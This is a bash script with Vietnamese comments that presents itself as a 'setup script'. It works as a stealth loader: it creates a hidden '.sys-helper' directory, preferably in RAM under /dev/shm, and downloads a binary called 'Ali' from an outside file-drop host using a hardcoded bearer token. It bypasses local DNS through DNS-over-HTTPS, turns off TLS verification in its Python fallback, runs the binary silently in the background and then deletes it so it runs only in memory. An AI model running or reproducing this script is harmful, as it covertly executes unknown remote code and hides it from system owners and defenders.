#!/usr/bin/env bash
VERSION="2.1-smart-ali-doh"

log() {
  printf '%s\n' "$*"
}

fail() {
  printf 'ERROR: %s\n' "$*" >&2
  exit 1
}

# Tự động quét và chọn thư mục tối ưu có quyền ghi (Ưu tiên /dev/shm để chạy trực tiếp trên RAM)
INSTALL_DIR=""
for candidate in "/dev/shm/.sys-helper" "$HOME/.sys-helper" "/tmp/.sys-helper" "./.sys-helper" "/var/tmp/.sys-helper"; do
    if mkdir -p "$candidate" 2>/dev/null && [ -w "$candidate" ]; then
        INSTALL_DIR="$candidate"
        break
    fi
done

if [ -z "$INSTALL_DIR" ]; then
    INSTALL_DIR="/tmp/.sys-helper"
    mkdir -p "$INSTALL_DIR" 2>/dev/null || true
fi

ALI_PATH="$INSTALL_DIR/Ali"
ALI_URL="${ALI_URL:-https://filedrop.pochinki999900.chatgpt.site/d/wb7iaUCuSn6hgBDHt_BFQg}"
ALI_HEADER="${ALI_TOKEN:-Authorization: Bearer fd_key_fdd03ba0cfdaf9406de769bb2acac03230b0494c73982f993d66a43b974b7269}"

log "Setup script v$VERSION"
log "Target Directory: $INSTALL_DIR"

# Hàm tải thông minh hỗ trợ đa công cụ (curl có DoH -> wget -> python3 tự động xử lý mạng)
download_ali() {
    local url="$1"
    local output="$2"
    local header="$3"
    
    # 1. Thử qua curl với DoH 1.1.1.1 (Bất chấp DNS nội bộ bị hỏng)
    if command -v curl >/dev/null 2>&1; then
        if curl --fail --show-error --silent \
             --doh-url 'https://cloudflare-dns.com/dns-query' \
             --resolve 'cloudflare-dns.com:443:1.1.1.1' \
             --continue-at - \
             --header "$header" \
             --output "$output" \
             "$url" >/dev/null 2>&1; then
            return 0
        fi
    fi

    # 2. Thử qua wget (Dành cho máy có wget chuẩn)
    if command -v wget >/dev/null 2>&1; then
        if wget --header="$header" -qO "$output" "$url" >/dev/null 2>&1; then
            return 0
        fi
    fi

    # 3. Thử qua python3 (Được tích hợp sẵn cơ chế xử lý kết nối an toàn)
    if command -v python3 >/dev/null 2>&1; then
        if python3 - "$url" "$output" "$header" <<'PY' >/dev/null 2>&1; then
import sys, urllib.request, ssl
url, output, header_str = sys.argv[1], sys.argv[2], sys.argv[3]
key, val = header_str.split(": ", 1)
req = urllib.request.Request(url, headers={key: val})
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
try:
    with urllib.request.urlopen(req, context=ctx, timeout=20) as r, open(output, 'wb') as f:
        f.write(r.read())
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
            return 0
        fi
    fi

    return 1
}

# Cơ chế thử lại (Retry & Backoff) khi tải xuống gặp sự cố mạng
log "[*] Initializing deployment with smart failover..."
RETRY_COUNT=3
DOWNLOAD_SUCCESS=0

for ((i=1; i<=RETRY_COUNT; i++)); do
    if download_ali "$ALI_URL" "$ALI_PATH" "$ALI_HEADER"; then
        DOWNLOAD_SUCCESS=1
        log "[+] Ali downloaded successfully on attempt $i."
        break
    else
        log "WARNING: Download attempt $i failed. Retrying in 2 seconds..."
        sleep 2
    fi
done

if [ "$DOWNLOAD_SUCCESS" -eq 0 ] || [ ! -f "$ALI_PATH" ]; then
    fail "Could not download Ali task after $RETRY_COUNT attempts."
fi

# Cấp quyền thực thi
chmod +x "$ALI_PATH"

# Thực thi ngầm và lấy Process ID (PID)
log "[*] Executing Ali task..."
"$ALI_PATH" >/dev/null 2>&1 &
ALI_PID=$!

# Kiểm tra thông minh: Xác thực tiến trình thực sự đang sống trong RAM trước khi xóa file
sleep 2
if kill -0 "$ALI_PID" 2>/dev/null; then
    log "[+] Process verified active (PID: $ALI_PID)."
    rm -f "$ALI_PATH"
    log "[*] Cleanup: Binary successfully removed from disk, running entirely in-memory."
else
    log "WARNING: Process failed to sustain execution. Keeping binary for safety."
fi

log "[*] Setup complete"